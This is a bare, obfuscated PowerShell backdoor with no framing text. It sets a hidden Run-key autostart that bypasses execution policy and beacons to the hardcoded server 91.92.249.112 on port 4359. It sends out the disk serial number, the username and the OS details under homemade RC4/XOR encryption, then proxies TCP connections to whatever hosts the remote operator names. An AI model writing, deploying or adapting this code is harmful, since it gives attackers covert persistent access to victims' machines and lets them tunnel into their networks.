$xorec = New-Object byte[] 50

$ipaddress = '91.92.249.112'
$dport = 4359

For ($i=0; $i -ne 50; $i++) { $xorec[$i] =  $i }

$newconnct={
	
	 Param
	 (
		 $sArray,
		 $randomn2,
		 $ip,
		 $newport,
		 $xorec_,
		 $s,
		 $w,
		 $r
	 )
	 
	 Function cryptf2($passw, [int]$length, $buff0, $start, $sz)
	 {

		 $rc4 = New-Object byte[] 256
	
		 [int]$randomn0 = 0
	
		 [int]$randomn1 = 0
	
		 [int]$randomn2 = 0
	
		 [int]$randomn3 = 0
	
		 [int]$randomn4 = 0
	
		 [int]$randomn5 = 0
	
		 [int]$randomn6 = 0
	
		 [int]$randomn7 = 0
	
		 [int]$randomn8 = 0
	
		 [int]$t = 0
	
		 [int]$gs = 0
		 
		 [int]$repeat0 = 0
	
		 For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
		 
		 [int]$rsi = 0
		 
		 [int]$rcx = $sz
		 
		 [int]$rbx = 0
		 
		 do
		 {
			 $buff0[$start + $rsi] = $buff0[$start + $rsi] -bxor $passw[$rbx]
			 
			 $rsi++
			 
			 $rbx++
			 
			 $rcx--
			 
			 if ($rbx -eq $length)
			 {
				 $rbx = 0
			 }
		 }
		 
		 while($rcx -gt 0)
		 
		 do
		 {
			 if ($gs -eq 0)
			 {
				 $randomn2 = 0

				 $randomn3 = $length
			 }

			 if ($gs -ne 0)
			 {
				 $gs = 0

				 $randomn2++

				 if (--$randomn3 -eq 0)
				 {
					 continue
				 }
			 
			 }
		 
			 $randomn7 = $rc4[$randomn0]

			 $t = $passw[$randomn2] -as[int]

			 $randomn1 += $t

			 $randomn1 = $randomn1 -band 255

			 $randomn1 += $randomn7

			 $randomn1 = $randomn1 -band 255

			 $randomn6 = $rc4[$randomn1]
		 
			 $rc4[$randomn0] = $randomn6

			 $rc4[$randomn1] = $randomn7

			 $randomn0++

			 $randomn0 = $randomn0 -band 255

			 if ($randomn0 -ne 0)
			 {
				 $gs = 1
			 
				 continue
			 }

			 $randomn4 = $sz

			 $randomn1 = 0

			 $randomn0 = 0

			 $randomn2 = 0

			 $randomn3 = 0
		 
			 do
			 {
				 $randomn2++

				 $randomn2 = $randomn2 -band 255

				 $randomn7 = $rc4[$randomn2]
			 
				 $randomn1 += $randomn7

				 $randomn1 = $randomn1 -band 255

				 $randomn8 = $rc4[$randomn1]

				 $rc4[$randomn2] = $randomn8

				 $rc4[$randomn1] = $randomn7

				 $randomn8 += $randomn7
	
				 $randomn8 = $randomn8 -band 255

				 $randomn0 = $rc4[$randomn8]
			 
				 $randomn5 = $buff0[$start + $randomn3]

				 $randomn5 = $randomn5 -bxor $randomn0
			 
				 $buff0[$start + $randomn3] = $randomn5 -as [byte]

				 $randomn3++
			 
				 if (--$randomn4 -eq 0)
				 {
					 break
				 }
			 }
		 
			 while($true)
		 
			 break
		 }
	
		 while($true)
		 
		 [int]$rsi = 0
		 
		 [int]$rcx = $sz
		 
		 [int]$rbx = 0
		 
		 do
		 {
			 $buff0[$start + $rsi] = $buff0[$start + $rsi] -bxor $passw[$rbx]
			 
			 $rsi++
			 
			 $rbx++
			 
			 $rcx--
			 
			 if ($rbx -eq $length)
			 {
				 $rbx = 0
			 }
		 }
		 
		 while($rcx -gt 0)
	 }
	 
	 [int]$tr = 0
	 
	 $cs = $null
	 
	 $bf = New-Object byte[] 65536
	 
	 $buffer = New-Object byte[] 13
	 
	 For ($i=0; $i -ne 13; $i++) { $buffer[$i] = 0x00 }
	 
	 $buffer[0] = $randomn2 -as [byte]
	 
	 $buffer[1]  = 0x0A
	 $buffer[3]  = 0x05
	 $buffer[6]  = 0x01

	 try
	 {
		 $_t = 1

		 $sArray[$randomn2] = New-Object System.Net.Sockets.TcpClient( $ip, $newport)
		 
		 $cs = $sArray[$randomn2];
	 
		 $sArray[$randomn2].NoDelay = $true
	 
		 $sArray[$randomn2].ReceiveTimeout = $_t * 1000
	 
		 $s[$randomn2] = $sArray[$randomn2].GetStream()
	 
		 $r[$randomn2] = New-Object System.IO.BinaryReader($s[$randomn2])
	 
		 $w[$randomn2] = New-Object System.IO.BinaryWriter($s[$randomn2])
		 
		 cryptf2 $xorec_ 50 $buffer 0 3
		 cryptf2 $xorec_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
	 
	 catch
	 
	 {
		 #$sArray[$randomn2] = $null
		 
		 $buffer[4] = 0x01
		 
		 cryptf2 $xorec_ 50 $buffer 0 3
		 cryptf2 $xorec_ 50 $buffer 3 10
		 
		 $w[0].Write($buffer, 0, 13)
		 $w[0].Flush()
	 }
		 
	 try
	 {
		 do
		 {
			 try
		 
			 {
				 $st = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
				 
				 $rc = $r[$randomn2].Read($bf, 3, 65530)
				  
				 if ($rc -eq 0) { break }
				 
			  }
			  
			 catch
			 
			 {
				 $end = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
				 
				 $Time = $end - $st
				 
				 if ($Time -ge $_t)
				 {
					 continue
				 }
				 
				 break
			 }
			 
			 $bf[0] = $randomn2 -as[byte]
			 
			 $rc0 = $rc -band 0x000000ff
			 $rc1 = [math]::Floor(($rc -band 0x0000ff00) * [math]::Pow(2,-8))
			 
			 $bf[1] = $rc0 -as[byte]
			 $bf[2] = $rc1 -as[byte]
			 
			 cryptf2 $xorec_ 50 $bf 0 3
			 cryptf2 $xorec_ 50 $bf 3 $rc
			 
			 $w[0].Write($bf, 0, $rc + 3)
			 $w[0].Flush()
		 }
		 
		 while($sArray[$randomn2] -ne $null)
		 
	 }
	 
	 catch
	 
	 {
		 $tr++
	 }
	 
	 #$sArray[$randomn2] = $null
	 
	 $buffer[0] = $randomn2 -as [byte]
	 $buffer[1] = 0x00
	 $buffer[2] = 0x00
	 
	 cryptf2 $xorec_ 50 $buffer 0 3
	 
	 $w[0].Write($buffer, 0, 3)
	 $w[0].Flush()
	 
	 if ($cs -ne $null) { $cs.Close() }
	 
}

Function cryptf($passw, [int]$length, $buff0, $start, $sz)
{

	$rc4 = New-Object byte[] 256
	
	[int]$randomn0 = 0
	
	[int]$randomn1 = 0
	
	[int]$randomn2 = 0
	
	[int]$randomn3 = 0
	
	[int]$randomn4 = 0
	
	[int]$randomn5 = 0
	
	[int]$randomn6 = 0
	
	[int]$randomn7 = 0
	
	[int]$randomn8 = 0
	
	[int]$t = 0
	
	[int]$gs = 0
	
	For ($i=0; $i -le 255; $i++) { $rc4[$i] =  $i }
	
	[int]$rsi = 0
	
	[int]$rcx = $sz
	
	[int]$rbx = 0
	
	do
	{
		$buff0[$start + $rsi] = $buff0[$start + $rsi] -bxor $passw[$rbx]
		
		$rsi++
		
		$rbx++
		
		$rcx--
		
		if ($rbx -eq $length)
		{
			$rbx = 0
		}
		
		
	}
	
	while($rcx -gt 0)
	
	do
	{
		 if ($gs -eq 0)
		 {
			 $randomn2 = 0

			 $randomn3 = $length
		 }

		 if ($gs -ne 0)
		 {
			 $gs = 0

			 $randomn2++

			 if (--$randomn3 -eq 0)
			 {
				 continue
			 }
			 
		 }
		 
		 $randomn7 = $rc4[$randomn0]

		 $t = $passw[$randomn2] -as[int]

		 $randomn1 += $t

		 $randomn1 = $randomn1 -band 255

		 $randomn1 += $randomn7

		 $randomn1 = $randomn1 -band 255

		 $randomn6 = $rc4[$randomn1]
		 
		 $rc4[$randomn0] = $randomn6

		 $rc4[$randomn1] = $randomn7

		 $randomn0++

		 $randomn0 = $randomn0 -band 255

		 if ($randomn0 -ne 0)
		 {
			 $gs = 1
			 
			 continue
		 }

		 $randomn4 = $sz

		 $randomn1 = 0

		 $randomn0 = 0

		 $randomn2 = 0

		 $randomn3 = 0
		 
		 do
		 {
			 $randomn2++

			 $randomn2 = $randomn2 -band 255

			 $randomn7 = $rc4[$randomn2]
			 
			 $randomn1 += $randomn7

			 $randomn1 = $randomn1 -band 255

			 $randomn8 = $rc4[$randomn1]

			 $rc4[$randomn2] = $randomn8

			 $rc4[$randomn1] = $randomn7

			 $randomn8 += $randomn7
	
			 $randomn8 = $randomn8 -band 255

			 $randomn0 = $rc4[$randomn8]
			 
			 $randomn5 = $buff0[$start + $randomn3]

			 $randomn5 = $randomn5 -bxor $randomn0
			 
			 $buff0[$start + $randomn3] = $randomn5 -as [byte]

			 $randomn3++
			 
			 if (--$randomn4 -eq 0)
			 {
				 break
			 }
		 }
		 
		 while($true)
		 
		 break
	}
	
	while($true)
	
	[int]$rsi = 0
	
	[int]$rcx = $sz
	
	[int]$rbx = 0
	
	do
	{
		$buff0[$start + $rsi] = $buff0[$start + $rsi] -bxor $passw[$rbx]
		
		$rsi++
		
		$rbx++
		
		$rcx--
		
		if ($rbx -eq $length)
		{
			$rbx = 0
		}
	}
	
	while($rcx -gt 0)
}

Function mainsys([string]$ipaddress, [int]$dport)
{
	 $buffer = New-Object byte[] 3
	 
	 $sArray = @(0) * 200
	 
	 For ($i=0; $i -ne 200; $i++) { $sArray[$i] = $null }
	 
	 $s = @(0) * 200
	 
	 $w = @(0) * 200
	 
	 $r = @(0) * 200
	 
	 $_t = 60
	 
	 [int]$tr = 0
	 
	 [int]$newport = 0
	 
	 [string]$ip
	 
	 [int]$randomn1 = 0
	 
	 [int]$randomn2 = 0
	 
	 [int]$randomn0 = 0
	 
	 [int]$randomn9 = 0
	 
	 [int]$randomn12 = 0
	 
	 [int]$rc = 0
	 
	 [int]$randomn10 = 0
	 
	 [int]$randomn11 = 0
	 
	 [int]$rm = 0
	 
	 [int]$rm4 = 0
	 
	 $jpool = New-Object object[] 200
	 
	 $bf7 = New-Object byte[] 20
	 
	 $bf0 = New-Object byte[] 65536

	 $bf1 = New-Object byte[] 65536

	 $rb = New-Object byte[] 65536
	 
	 try
	 
	 {
		 $pool = [RunspaceFactory]::CreateRunspacePool(1, 200)
		 $pool.Open()
		 
		 $sArray[0] = New-Object System.Net.Sockets.TcpClient( $ipaddress, $dport)
	 
		 $sArray[0].NoDelay = $true
	 
		 $sArray[0].ReceiveTimeout = $_t * 1000
	 
		 $s[0] = $sArray[0].GetStream()
	 
		 $r[0] = New-Object System.IO.BinaryReader($s[0])
	 
		 $w[0] = New-Object System.IO.BinaryWriter($s[0])
		 
		 For ($i=0; $i -ne 50; $i++) { $bf0[$i] = $xorec[$i] }
		 
		 For ($i=50; $i -ne 100; $i++) { $bf0[$i] = 0 }
	 
		 $i64 = 0
	 
		 if ([IntPtr]::Size -eq 8) {$i64 = 1}
		 
		 $bf0[53] = $i64 -as[byte]
	 
		 $os = [system.environment]::osversion.version.build
	 
		 $o0 = $os -band 0x000000ff
		 $o1 = [math]::Floor(($os -band 0x0000ff00) * [math]::Pow(2,-8))
		 
		 $bf0[50] = $o0 -as[byte]
		 $bf0[51] = $o1 -as[byte]
		 
		 $drive_serialnumber = Get-Partition -DriveLetter C  | Get-Disk | select-object -ExpandProperty SerialNumber
		 
		 $user = $(whoami)
		 
		 For (($i=99), ($c=0); $c -ne $drive_serialnumber.Length -and $c -ne 40 ; $i--, $c++) { $bf0[$i] = $drive_serialnumber[$c] }
		 
		 For ($i=0; $i -ne $user.Length; $i++) { $bf0[54 + $i] = $user[$i] }
		 
		 $bf0[54 + $user.Length] = 0x00 -as[byte]
		 
		 cryptf $xorec 50 $bf0 50 50
		 
		 $w[0].Write($bf0, 0, 100)
		 $w[0].Flush()
		 
		 [int]$receive7 = 0
		 
	 	 while($true)
	 	 {
			 $st = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
			 
			 try
		 
		 	 {
			 	 if ($randomn10 -eq 0 -and $rm4 -ne 4)
	 	 	 	 {
				 	 $rc = $r[0].Read($bf1, 0, 65536)
					 
					 if ($rc -eq 0)
					 {
						 break
					 }
					 
					 $receive7 = 0
			 	 }
		 	 }
	 
		 	 catch
	 
		 	 {
			 	 $end = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
				 
				 $Time = $end - $st
				 
			 	 if ($Time -ge $_t)
			 	 {
				 	 if ($rm -ne 0 -or $rm4 -ne 0) { break }
					 
					 $receive7++
					 
					 if ($receive7 -eq 2) { break }
					 
					 $bf7[0] = 0x00 -as[byte]
					 $bf7[1] = 0x00 -as[byte]
					 $bf7[2] = 0x00 -as[byte]
					 
					 cryptf $xorec 50 $bf7 0 3
					 
					 $w[0].Write($bf7, 0, 3)
					 $w[0].Flush()
					 
				 	 continue
			 	 }
				 
			 	 break
		 	 }
			 
		 	 if ($rm -ne 0 -or $rm4 -eq 4)
	 	 	 {
			 	 if ($bf0[2 + 0] -eq 0x00 -as[byte] -and $bf0[2 + 1] -eq 0x00 -as[byte])
			 	 {
	 	 		 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFE -as[byte])
	 	 		 	 {
	 	 			 	 $randomn12 = 1
						 
	 	 			 	 break
	 	 		 	 }
					 
					 if ($bf0[0 + 0] -eq 0x00 -as[byte] -and $bf0[0 + 1] -eq 0x00 -as[byte])
					 
					 {
						 
						 $bf0[0 + 0] = 0x00 -as[byte]
						 
					 }
					 
					 if ($bf0[0 + 1] -lt 0xC8 -as[byte] -and $bf0[0 + 1] -gt 0x00 -as[byte])
					 
					 {
						 $randomn0 = $bf0[1]

						 if ($sArray[$randomn0] -ne $null) { $sArray[$randomn0] = $null }
						 
					 }
					 
	 	 	 	 }
			 
	 	 	 	 else
			 
	 	 	 	 {
	 	 		 	 if ($randomn10 -eq 0)
	 	 		 	 {
					 	 if ($rc -eq 0)
					 	 {
						 
						 	 try
						 
						 	 {
							 
							 	 $rc = $r[0].Read($bf1, 0, 65536)
								 
								 if ($rc -eq 0)
								 {
									 break
								 }
							 
						 	 }
						 
						 	 catch
						 
						 	 {
								 break
							 
						 	 }
						 
					 	 }

					 	 if ($rc -lt 0 -or $rc -eq 0)
						 {
							 break
						 }

					 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }

	 	 			 	 $randomn10 = $rc
					 
	 	 			 	 $randomn11 = 0
					 
					 	 $rc = 0
	 	 		 	 }
				 
	 	 		 	 $randomn9 = $rm
				 
				 	 $randomn0 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

	 	 		 	 $randomn0 -= $randomn9
				 
	 	 		 	 if ($randomn10 -le $randomn0) { $randomn0 = $randomn10 }
				 
				 	 For ($i=0; $i -ne $randomn0; $i++) { $bf0[$i + $randomn9 + 4] = $rb[$i + $randomn11] }
				 
	 	 		 	 $randomn11 += $randomn0
				 
	 	 		 	 $randomn10 -= $randomn0
				 
	 	 		 	 $rm += $randomn0
					 
				 	 if ((256 * $bf0[2 + 1] + $bf0[2 + 0]) -eq $rm)
	 	 		 	 {
						 $randomn1 = 256 * $bf0[2 + 1] + $bf0[2 + 0]

						 cryptf $xorec 50 $bf0 4 $randomn1
					 
	 	 			 	 $randomn2 = $bf0[1]
					 
	 	 			 	 if ($bf0[0] -eq 0xFF -as[byte] -and $bf0[1] -eq 0xFF -as[byte])
	 	 			 	 {
	 	 				 	 $tr++
					 	 }
					 
	 	 			 	 elseif ($bf0[0] -eq 0x00 -as[byte])
					 
	 	 			 	 {
						 	 [string]$ip = "empty"

							 $newport = 100000
							 
							 
							 if ($bf0[4 + 3] -eq 0x03 -as[byte])
						 	 {
							 	 $newport = 256 * $bf0[4 + 5 + $bf0[4 + 4] + 0] + $bf0[4 + 5 + $bf0[4 + 4] + 1]
								 
							 	 $fB = New-Object byte[] $bf0[4 + 4]
								 
							 	 For ($i=0; $i -ne $bf0[4 + 4] -as[int]; $i++) { $fB[$i] = $bf0[$i + 4 + 5] }
								 
							 	 [string]$ip = [System.Text.Encoding]::ASCII.GetString($fB)
						 	 }

						 	 elseif ($bf0[4 + 3] -eq 0x01 -as[byte])

						 	 {
							 	 [int]$a = $bf0[4 + 4 + 0] -as[int]
							 	 [int]$b = $bf0[4 + 4 + 1] -as[int]
							 	 [int]$c = $bf0[4 + 4 + 2] -as[int]
							 	 [int]$ip = $bf0[4 + 4 + 3] -as[int]

							 	 [string]$ip = "{0}.{1}.{2}.{3}" -f $a, $b, $c, $ip

							 	 $newport = 256 * $bf0[4 + 8 + 0] + $bf0[4 + 8 + 1]
						 	 }

							 $intililiaze = [PowerShell]::Create()
							 $intililiaze.RunspacePool = $pool

							 [void]$intililiaze.AddScript($newconnct)
		
							 [void]$intililiaze.AddParameter("newport", $newport)
							 [void]$intililiaze.AddParameter("xorec_", $xorec)
							 [void]$intililiaze.AddParameter("sArray", $sArray)
							 [void]$intililiaze.AddParameter("randomn2", $randomn2)
							 [void]$intililiaze.AddParameter("ip", $ip)
							 [void]$intililiaze.AddParameter("s", $s)
							 [void]$intililiaze.AddParameter("w", $w)
							 [void]$intililiaze.AddParameter("r", $r)
							 
							 $jpool[$i] = [PSCustomObject]@{
								 PowerShell = $intililiaze
								 AsyncResult = $intililiaze.BeginInvoke()
							 }
							 
						 }
					 
	 	 			 	 else
					 
	 	 			 	 {
						 	 try
						 
						 	 {
						 
							 	 $w[$randomn2].Write($bf0, 4, $randomn1)
							 	 $w[$randomn2].Flush()
							 
						 	 }
						 
						 	 catch
						 
						 	 {
							 
							 	 $tr++
							 
						 	 }
	 	 			 	 }
					 
	 	 			 	 $rm = 0
	 	 		 	 }
	 	 	 	 }
	 	 			 
	 	 	 	 $rm4 = 0

	 	 	 }
	 	 		 
	 	 	 else 
	 	 		
	 	 	 {
	 	 	 	 if ($randomn10 -eq 0)
	 	 	 	 {
				 	 if ($rc -eq 0)
				 	 {
					 
					 	 try
					 
					 	 {
						 
						 	 $rc = $r[0].Read($bf1, 0, 65536)
							 
							 if ($rc -eq 0)
							 {
								 break
							 }
							 
					 	 }
					 
					 	 catch
					 
					 	 {
						 	 break
						
					 	 }
					
				 	 }
					 

				 	 if ($rc -lt 0 -or $rc -eq 0)
					 {
						 break
					 }
					 
				 	 For ($i=0; $i -ne $rc; $i++) { $rb[$i] = $bf1[$i] }
				 
				 	 $randomn10 = $rc
				 
				 	 $randomn11 = 0
				 
				 	 $rc = 0
	 	 	 	 }
			 
	 	 	 	 $randomn0 = $rm4
			 
	 	 	 	 $randomn9 = 4
			 
	 	 	 	 $randomn9 -= $rm4
			 
	 	 	 	 if ($randomn10 -lt $randomn9) { $randomn9 = $randomn10 }
			 
			 	 For ($i=0; $i -ne $randomn9; $i++) { $bf0[$i + $randomn0] = $rb[$i + $randomn11] }
			 
	 	 	 	 $randomn11 += $randomn9
			 
	 	 	 	 $randomn10 -= $randomn9
			 
	 	 	 	 $rm4 += $randomn9
			 
	 	 	 	 if ($rm4 -eq 4) { cryptf $xorec 50 $bf0 0 4 }
	 	 	 }
	 	 }
	 
	 	 if ($randomn12 -eq 1)
	 	 {
		 	 Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "powershell"

		 	 [Environment]::Exit(0)
		 }
		 
		 throw "close"
	 
	 }
	 
	 catch
	 {
		 $pool.Dispose()
		 
		 if ($sArray[0] -ne $null) { $sArray[0].Close() }
	 }
}

try
{
	 $location = $MyInvocation.MyCommand.Definition
	 
	 $p = "HKCU:\SOFTWARE" + "\Microsoft\Windows\CurrentVersion\Run"
	 
	 Set-ItemProperty -Path $p -Name "powershell" -Value "Powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File `"$location`""

}

catch { }

while($true)
{
	 mainsys $ipaddress $dport
	 
	 Start-Sleep -s 180
}